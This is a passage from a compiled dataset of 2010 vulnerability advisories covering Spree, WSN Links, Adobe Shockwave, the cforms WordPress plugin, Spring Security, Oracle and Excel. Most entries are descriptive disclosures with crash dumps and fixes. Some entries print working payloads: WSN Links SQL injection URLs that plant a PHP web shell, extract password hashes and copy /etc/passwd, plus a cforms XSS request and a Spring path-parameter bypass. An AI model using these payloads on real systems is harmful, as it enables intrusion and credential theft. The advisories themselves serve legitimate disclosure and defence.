Temporal score is: E:F/RL:OF/RC:C
DETAILS
There are multiple JSON Hijacking vulnerabilities and as result, an attacker can steal confidential information such as: product costs, price and quantities and users email, encrypted password, tokens, OpenID identifier, phone and address as well as orders count and values by period.
There are some pages within the default Spree installation that use JavaScript Object Notation (JSON) as a transport mechanism between the client and the server. As the application cannot differentiate real requests from forged requests, and the JSON object returned can be accessed by the attacker's malicious code via a script tag, those pages are vulnerable to an attack known as JSON Hijacking.
The affected pages are:
- /admin/products.json
- /admin/users.json
- /admin/overview/get_report_data
Proof of concept exploitation code is available to interested parties.
CREDITS
This vulnerability has been brought to our attention by Gabriel Quadros from Conviso IT Security company (http://www.conviso.com.br) and researched internally by Rodrigo Rubira Branco from the Check Point Vulnerability Discovery Team (VDT).
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies
http://www.checkpoint.com/defense"
13980,'WSN Links' SQL Injection Vulnerability (CVE-2010-4006),,CVE-2010-4006,"'WSN Links' SQL Injection Vulnerability (CVE-2010-4006)
Mark Stanislav - mark.stanislav gmail com
I. DESCRIPTION
---------------------------------------
A vulnerability exists in the search.php code that allows for SQL injection of various parameters. By assembling portions of SQL code between the affected parameters, successful SQL injection into the software can occur. In the testing done, various 'UNION SELECT' SQL injections can occur.
II. AFFECTED VERSIONS
---------------------------------------
< 6.0.1; < 5.1.51 ; < 5.0.81
III. TESTED VERSIONS
---------------------------------------
5.1.40 & 5.1.49
IV. PoC EXPLOITS
---------------------------------------
1) A 'UNION SELECT' which results in a PHP shell-execution script
http://example.com/search.php?namecondition=IS%20NULL))%20UNION%20((SELECT%20""<?php%20system($_REQUEST[cmd]);%20?>""%20INTO%20OUTFILE&namesearch=/var/www/exec.php&action=filter&filled=1&whichtype=categories
2) A 'UNION SELECT' which results in a member's name, password hash, and e-mail to be extracted to a file
http://example.com/search.php?namecondition=IS%20NOT%20NULL))%20UNION%20((SELECT%20concat(name,0x3a,password,0x3a,email)%20FROM%20wsnlinks_members%20INTO%20OUTFILE&namesearch=/var/www/pass.txt&action=filter&filled=1&whichtype=categories
3) A 'UNION SELECT' which results in the /etc/passwd file being copied to a web directory file
http://example.com/search.php?namecondition=IS%20NOT%20NULL))%20UNION%20((SELECT%20load_file(0x2f6574632f706173737764)%20INTO%20OUTFILE&namesearch=/var/www/passwd.txt&action=filter&filled=1&whichtype=categories
V. NOTES
---------------------------------------
* The above exploits require 'FILE' SQL privilege as well as poor web directory permissions to work.
* Only 'namecondition' and 'namesearch' are utilized for the actual SQL injection.
* There is potential to exploit this vulnerability which outputs user data directly to the browser.
* Passing 'debug=1' as a query value easily enables debug mode of tested 'WSN Links' deployments.
VI. SOLUTION
---------------------------------------
Upgrade to the most recent version of your 'WSN Links' code branch.
VII. REFERENCES
---------------------------------------
http://www.wsnlinks.com/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4006
http://www.uncompiled.com/2010/10/wsn-links-sql-injection-vulnerability-cve-2010-4006/
VIII. TIMELINE
---------------------------------------
10/10/2010: Initial discloure e-mail to the vendor
10/18/2010: Follow-up via the vendor's contact web form
10/18/2010: Vendor acknowledgement/commitment to fix
10/21/2010: Patched versions released
10/31/2010: Public disclosure"
13984,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-4089,,CVE-2010-4089,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file (duplicated LCSM entries in mmap record)
CVE-2010-4089
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive presentations, and online entertainment.
Adobe Shockwave Player does not properly parse .dir media file. mmap records contains offsets and lengths of all other records. One of such records is LCSM. It also contains references to other records. Duplicated LCSM entries causes memory corruption as shown in PoC (repro15.dir).
This problem was confirmed in the following versions of Adobe Shockwave Player and Windows, other versions may be also affected.
Shockwave Player version 11.5.8.612, Module IML32.dll on WinXP_PT SP3 Internet Explorer 8.0.6001.18702
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro15.dir) is available to interested parties.
DETAILS
ModLoad: 03a20000 03a27000 C:WINDOWSsystem32AdobeShockwave 11xtrasCBrowser.x32
ModLoad: 03e10000 03e27000 C:Documents and SettingsRodrigoApplication DataAdobeShockwave Player 11xtrasdownloadAdobeSystemsIncorporatedTextAssetText Asset.x32
ModLoad: 048a0000 04989000 C:Documents and SettingsRodrigoApplication DataAdobeShockwave Player 11xtrasdownloadAdobeSystemsIncorporatedTextXtraTextXtra.x32
ModLoad: 04430000 04475000 C:Documents and SettingsRodrigoApplication DataAdobeShockwave Player 11xtrasdownloadAdobeSystemsIncorporatedFontXtraFont Xtra.x32
(1cc.b74): Access violation - code c0000005 (!!! second chance !!!)
eax=00000068 ebx=00000020 ecx=0162d550 edx=00000068 esi=0162d550 edi=0543386c
eip=69009f1f esp=0162d540 ebp=0543386c iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
*** WARNING: Unable to verify checksum for C:WINDOWSsystem32AdobeShockwave 11IML32.dll
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:WINDOWSsystem32AdobeShockwave 11IML32.dll -
IML32!Ordinal1113+0xf:
69009f1f 8b4804 mov ecx,dword ptr [eax+4] ds:0023:0000006c=????????
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
0:008> !exploitable
Exploitability Classification: UNKNOWN
Recommended Bug Title: Data from Faulting Address controls Branch Selection starting at IML32!Ordinal1113+0x000000000000000f (Hash=0x1a537c3d.0x1a63313d)
The data from the faulting address is later used to determine whether or not a branch is taken.
Exploitation details sent to Adobe.
CREDITS
This vulnerability was discovered by Michael Golub and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
13985,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-4087,,CVE-2010-4087,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file (mmap record - VSWV entry)
CVE-2010-4087
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive presentations, and online entertainment.
Adobe Shockwave Player does not properly parse .dir media file, which causes a corruption in module IML32.dll by opening a malformed file with an invalid length of VSWV entry inside a mmap record.
This problem was confirmed in the following versions of Adobe Shockwave Player and Windows, other versions may be also affected.
Shockwave Player version 11.5.8.612, Module IML32.dll on WinXP_PT SP3 Internet Explorer 8.0.6001.18702
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro13.dir) is available to interested parties.
DETAILS
0:008> r
eax=0487d294 ebx=04830028 ecx=362607f0 edx=04930014 esi=0488dbf0 edi=0488d9e0
eip=69081264 esp=0162be10 ebp=00000210 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
IML32!Ordinal2064+0x7254:
69081264 894c31fc mov dword ptr [ecx+esi-4],ecx ds:0023:3aaee3dc=????????
0:008> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at IML32!Ordinal2064+0x0000000000007254 (Hash=0x3e3c3a38.0x484c154e)
User mode write access violations that are not near NULL are exploitable.
Disassembly:
0:008> u 0x69081264 L15
IML32!Ordinal2064+0x7254:
69081264 894c31fc mov dword ptr [ecx+esi-4],ecx
69081268 83c902 or ecx,2
6908126b 890e mov dword ptr [esi],ecx
6908126d 8b4318 mov eax,dword ptr [ebx+18h]
69081270 894608 mov dword ptr [esi+8],eax
69081273 8b4804 mov ecx,dword ptr [eax+4]
69081276 894e04 mov dword ptr [esi+4],ecx
69081279 8b5004 mov edx,dword ptr [eax+4]
6908127c 897208 mov dword ptr [edx+8],esi
6908127f 8b54241c mov edx,dword ptr [esp+1Ch]
69081283 897004 mov dword ptr [eax+4],esi
69081286 eb1e jmp IML32!Ordinal2064+0x7296 (690812a6)
69081288 8d3c31 lea edi,[ecx+esi]
6908128b 894ffc mov dword ptr [edi-4],ecx
6908128e 83c902 or ecx,2
69081291 890e mov dword ptr [esi],ecx
69081293 8b042f mov eax,dword ptr [edi+ebp]
69081296 8b7604 mov esi,dword ptr [esi+4]
69081299 83c802 or eax,2
6908129c 89042f mov dword ptr [edi+ebp],eax
6908129f 8bc5 mov eax,ebp
CREDITS
This vulnerability was discovered by Michael Golub and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
13986,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-4088,,CVE-2010-4088,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file (duplicated KEY* reference in mmap record)
CVE-2010-4088
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive
presentations, and online entertainment.
Adobe Shockwave Player does not properly parse .dir media file. mmap records contains offsets and lengths of all other records. One of such records is KEY*. It also contains references to other records. Duplicated references to the same KEY* chunk causes problems in Chrome.
This problem was confirmed in the following versions of Adobe Shockwave Player and Windows, other versions may be also affected.
Shockwave Player version 11.5.8.612, Module DIRAPI.dll on WinXP_PT SP3 Google Chrome 6.0.472.55
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro14.dir) is available to interested parties.
DETAILS
Due to the very nature of the problem and the way the browser handles it internally, it is very difficult to debug. The browser catches the
failure.
ModLoad: 041c0000 041c7000 C:WINDOWSsystem32AdobeSHOCKW~1xtrasCBrowser.x32
(924.a78): Break instruction exception - code 80000003 (first chance)
eax=7ffdd000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005
eip=7c90120e esp=312fffcc ebp=312ffff4 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=0038 gs=0000 efl=00000246
ntdll!DbgBreakPoint:
7c90120e cc int 3
After the break point hit, we see the browser just handles the crash of the plugin:
0:009> g
eax=7ffdd000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005
eip=7c90120f esp=312fffcc ebp=312ffff4 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=0038 gs=0000 efl=00000246
ntdll!DbgBreakPoint+0x1:
7c90120f c3 ret
0:009> k
ChildEBP RetAddr
312fffc8 7c951e40 ntdll!DbgBreakPoint+0x1
312ffff4 00000000 ntdll!DbgUiRemoteBreakin+0x2d
Forcing the browser to run in single-mode process we have:
ModLoad: 041c0000 041c7000 C:WINDOWSsystem32AdobeSHOCKW~1xtrasCBrowser.x32
ModLoad: 77920000 77a13000 C:WINDOWSsystem32SETUPAPI.dll
eax=00000001 ebx=7c802446 ecx=00000000 edx=00000000 esi=0073abc0 edi=000009e0
eip=7c90e460 esp=042cff08 ebp=042cff50 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!KiUserCallbackDispatcher:
7c90e460 83c404 add esp,4
7c90e463 5a pop edx
7c90e464 64a118000000 mov eax,dword ptr fs:[<Unloaded_papi.dll>+0x7 (00000018)]
7c90e46a 8b4030 mov eax,dword ptr [eax+30h]
7c90e46d 8b402c mov eax,dword ptr [eax+2Ch]
7c90e470 ff1490 call dword ptr [eax+edx*4]
7c90e473 33c9 xor ecx,ecx
7c90e475 33d2 xor edx,edx
7c90e477 cd2b int 2Bh
7c90e479 cc int 3
The Stack Trace:
ntdll!KiUserCallbackDispatcher+0x0
USER32!NtUserMessageCall+0xc
USER32!SendMessageA+0x7f
Plugin!NP_Shutdown+0x41f4
CREDITS
This vulnerability was discovered by Michael Golub and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
13987,cforms WordPress Plugin Cross Site Scripting Vulnerability - CVE-2010-3977,,CVE-2010-3977,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
cforms WordPress Plugin Cross Site Scripting Vulnerability
CVE-2010-3977
INTRODUCTION
According to Delicious Days, ""cforms is a powerful and feature rich form plugin for WordPress, offering convenient deployment of multiple Ajax
driven contact forms throughout your blog or even on the same page.""
This problem was confirmed in the following versions of the cforms WordPress Plugin, other versions
maybe also affected.
cforms v11.5
CVSS Scoring System
The CVSS score is: 5.5
Base Score: 6.7
Temporal Score: 5.5
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:N
Temporal score is: E:F/RL:OF/RC:C
DETAILS
A data array is created in lib_ajax.php using values from a form field in a POST request. The parameters rs and rsargs are not validated and thus
it is possible to inject code.
Request:
http://<server>/wp-content/plugins/cforms/lib_ajax.php
POST /wp-content/plugins/cforms/lib_ajax.php HTTP/1.1
Host: <server>
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:
1.9.2.10) Gecko/20100914 Firefox/3.6.10
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 219
Cookie: wp-settings-1=m0%3Do%26m1%3Do%26m2%3Do%26m3%3Do%26m4%3Do%26m5%3Do
%26m6%3Do%26m7%3Do%26m8%3Do%26urlbutton%3Dnone%26editor%3Dtinymce
%26imgsize%3Dfull%26align%3Dcenter%26hidetb%3D1%26m9%3Dc%26m10%3Do
%26uploader%3D1%26m11%3Do; wp-settings-time-1=1285758765;
c o m m e n t _ a u t h o r _ 9 3 f 4 1 b a 0 b 1 6 f 3 4 6 7 6 f 8 0 2 0 5 8 e 8 2 3 8 8 f 6 = t e s t ;
comment_author_email_93f41ba0b16f34676f802058e82388f6=rbranco_nospam
%40checkpoint.com
Pragma: no-cache
Cache-Control: no-cache
rs=<script>alert(1)</script>&rst=&rsrnd=1287506634854&rsargs[]=1$#
$<script>alert(1)</script>$#$rbranco_nospam checkpoint com$#$http://
www.checkpoint.com$#$<script>alert(1)</script>
CREDITS
This vulnerability has been brought to our attention by Wagner Elias from Conviso IT Security company (http://www.conviso.com.br) and researched internally by Rodrigo Rubira Branco from the Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
13988,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-4086,,CVE-2010-4086,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file (mmap_element_size)
CVE-2010-4086
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive presentations, and online entertainment.
Adobe Shockwave Player does not properly parse .dir media file, which causes a corruption in module DIRAPI.dll by opening a malformed file with an invalid element size.
This problem was confirmed in the following versions of Adobe Shockwave Player and Windows, other versions may be also affected.
Shockwave Player version 11.5.8.612, Module DIRAPI.dll on WinXP_PT SP3 Internet Explorer 8.0.6001.18702
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro12.dir) is available to interested parties. Important to note that a previous vulnerability discovered by
Rodrigo Rubira Branco (CVE-2010-2880) modified the index value used in the same structure.
DETAILS
0:008> r
eax=05215678 ebx=03a82dc8 ecx=0007ef40 edx=00000001 esi=0000001a edi=05301610
eip=044b2498 esp=0162ba14 ebp=0000007c iopl=0 nv up ei ng nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010292
DIRAPI!Ordinal21+0x6f8:
044b2498 6681600c1f7f and word ptr [eax+0Ch],offset <Unloaded_dui.DLL>+0x7f0e (00007f1f) ds:0023:05215684=????
0:008> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at DIRAPI!Ordinal21+0x00000000000006f8 (Hash=0x53080807.0x53080814)
User mode write access violations that are not near NULL are exploitable.
Disassembly:
0:008> u 0x044b2498 L15
DIRAPI!Ordinal21+0x6f8:
044b2498 6681600c1f7f and word ptr [eax+0Ch],offset <Unloaded_dui.DLL>+0x7f0e (00007f1f)
044b249e 83fe03 cmp esi,3
044b24a1 668b480c mov cx,word ptr [eax+0Ch]
044b24a5 7d1a jge DIRAPI!Ordinal21+0x721 (044b24c1)
044b24a7 813858464952 cmp dword ptr [eax],52494658h
044b24ad 7509 jne DIRAPI!Ordinal21+0x718 (044b24b8)
044b24af 8b4804 mov ecx,dword ptr [eax+4]
044b24b2 83c108 add ecx,8
044b24b5 894f48 mov dword ptr [edi+48h],ecx
044b24b8 c7401000000000 mov dword ptr [eax+10h],0
044b24bf eb19 jmp DIRAPI!Ordinal21+0x73a (044b24da)
044b24c1 f6c104 test cl,4
044b24c4 7507 jne DIRAPI!Ordinal21+0x72d (044b24cd)
044b24c6 c7401000000000 mov dword ptr [eax+10h],0
044b24cd 837804ff cmp dword ptr [eax+4],0FFFFFFFFh
044b24d1 7507 jne DIRAPI!Ordinal21+0x73a (044b24da)
044b24d3 c7400400000000 mov dword ptr [eax+4],0
044b24da 46 inc esi
044b24db 3bf5 cmp esi,ebp
044b24dd 7cb2 jl DIRAPI!Ordinal21+0x6f1 (044b2491)
044b24df 90 nop
CREDITS
This vulnerability was discovered by Michael Golub and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14010,CVE-2010-3700: Spring Security bypass of security constraints,,CVE-2010-3700,"CVE-2010-3700 - Spring Security - Bypassing of security constraints
Severity:
Important
Vendor:
SpringSource, a division of VMware
Versions affected:
Spring Security 3.0.0 to 3.0.3
Spring Security 2.0.0 t0 2.0.5
Acegi Security 1.0.0 to 1.0.7
Description:
Spring Security does not consider URL path parameters when processing security constraints. By adding an URL path parameter to a request, an attacker may be able to bypass a security constraint. The root cause of this issue is a lack of clarity regarding the handling of path parameters in the Servlet Specification (see below). Some Servlet containers include path parameters in the value returned for getPathInfo() and some do not. Spring Security uses the value returned by getPathInfo() as part of the process of mapping requests to security constraints. The unexpected presence of path parameters can cause a constraint to be bypassed.
Users of Apache Tomcat (all current versions) are not affected by this vulnerability since Tomcat follows the guidance previously provided by the Servlet Expert group and strips path parameters from the value returned by getContextPath(), getServletPath() and getPathInfo().
Users of SpringSource tc Server (all versions) are not affected. tc Server uses Apache Tomcat and does not change the handling of path parameters.
Users of SpringSource dm Server (all versions) are not affected. dm Server uses Apache Tomcat and does not change the handling of path parameters.
Users of other Servlet containers based on Apache Tomcat may or may not be affected depending on whether or not the handling of path parameters has been modified.
Users of Geronimo 2.2 with Jetty 7 are not affected.
Users of IBM WebSphere Application Server 6.1 and 7.0 are known to be affected.
Users of other containers that implement the Servlet specification may be affected.
Mitigation:
Adopting one of the following mitigations will protect against this vulnerability
- use a Servlet container known not to include path parameters in the return values for getServletPath() and getPathInfo()
- upgrade to Spring Security 2.0.6 or Spring Security 3.0.4
Example:
An application that uses the following intercept URL pattern:
<intercept-url pattern=""/*-add.do"" access=""PERMISSION_ADMIN""/>
to protect URLs such as:
/myapp/account-add.do
can be exploited by an attacker that uses a URL of the form:
/ctx/account-add.do;x=-pub.do
Credit:
This issue was discovered and reported to the SpringSource security team
by Ed Schaller.
Path parameters and the Servlet Specification:
This discussion applies to versions 2.3, 2.4, 2.5 & 3.0 of the Servlet Specification.
The Servlet Specification defines the following:
requestURI = contextPath + servletPath + pathInfo
It also states that:
- path parameters are returned by getRequestURI() and getPathInfo()
- context path & path parameters are ignored when mapping requests to servlets (2.4 onwards)
The specification does not state:
- if the value returned by getContextPath() include path parameters or not. The implication is that it should not.
- if the value returned by getServletPath() include path parameters or not. The implication is that it should not.
The Servlet expert group has previously indicated [1] that the specification would be altered to state that getPathInfo() should not return path parameters and that clarification would be added to confirm that getContextPath() and getServletPath() should not return path parameters either. This clarification was never added to the specification.
References:
[1] https://issues.apache.org/bugzilla/show_bug.cgi?id=25015
[2] http://www.springsource.com/security/spring-security
[3] http://www.springsource.com/download/community?project=Spring%20Security"
14112,VUPEN Security Research - Oracle Products HTTP Request Remote Buffer Overflow Vulnerability (CVE-2010-2390),,CVE-2010-2390,"VUPEN Security Research - Oracle Products HTTP Request Remote Buffer Overflow Vulnerability (CVE-2010-2390)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Oracle provides the world's most complete, open, and integrated business
software and hardware systems, with more than 370 000 customers including
100 of the Fortune 100 representing a variety of sizes and industries
in more than 145 countries around the globe.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in various Oracle products.
The vulnerability is caused by a buffer overflow error in the EM Console
when processing overly long HTTP requests, which could allow remote
unauthenticated attackers to crash an affected service or execute arbitrary
code via a malicious request.
III. AFFECTED PRODUCTS
---------------------------
Oracle Database 10g Release 2 version 10.2.0.3 and prior
Oracle Database 10g Release 1 version 10.1.0.5 and prior
Oracle Application Server 10gR2 version 10.1.2.3.0 and prior
Oracle Identity Management 10g version 10.1.4.3 and prior
Oracle Enterprise Manager Grid Control
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a PoC are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply Oracle Critical Patch Update - October 2010
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/searchengine.php?keyword=CVE-2010-2390
http://www.oracle.com/technetwork/topics/security/cpuoct2010-175626.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2390
X. DISCLOSURE TIMELINE
-----------------------------
2009-11-24 - Vendor notified
2009-11-25 - Vendor response
2010-09-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14113,VUPEN Security Research - Microsoft Office Excel Ghost Record Type Parsing Vulnerability (CVE-2010-3242),,CVE-2010-3242,"VUPEN Security Research - Microsoft Office Excel Ghost Record Type Parsing Vulnerability (CVE-2010-3242)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by an input validation error when processing
certain elements in a Ghost record, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening a
specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2008 for Mac
Microsoft Office 2004 for Mac
Microsoft Office XP Service Pack 3
Open XML File Format Converter for Mac
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/2627
http://www.microsoft.com/technet/security/bulletin/ms10-080.mspx
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3242
X. DISCLOSURE TIMELINE
-----------------------------
2010-04-02 - Vendor notified
2010-04-02 - Vendor response
2010-08-25 - Status update received
2010-10-12 - Coordinated public Disclosure"
14114,VUPEN Security Research - Microsoft Office Excel Out-of-Bounds Memory Write Vulnerability (CVE-2010-3241),,CVE-2010-3241,"VUPEN Security Research - Microsoft Office Excel Out-of-Bounds Memory Write Vulnerability (CVE-2010-3241)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
Microsoft Office Excel is a powerful tool you can use to create and
format spreadsheets, and analyze and share information to make more
informed decisions. With the Microsoft Office Fluent user interface,
rich data visualization, and PivotTable views, professional-looking
charts are easier to create and use.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Office Excel.
The vulnerability is caused by a memory corruption error when processing
certain structures in an Excel file, which could be exploited by remote
attackers to execute arbitrary code by tricking a user into opening a
specially crafted Excel document.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2008 for Mac
Microsoft Office 2004 for Mac
Microsoft Office XP Service Pack 3
Open XML File Format Converter for Mac
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerabilities fixed by Microsoft
in October 2010 and code execution exploits or PoCs are available
through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
Governments and Intelligence agencies who are members of the VUPEN Threat
Protection Program (TPP) have been alerted about the vulnerability when it
was discovered by VUPEN, and have received a detailed detection guidance
to proactively protect national and critical infrastructures against
potential attacks exploiting this vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS10-080 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Chaouki Bekrar of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
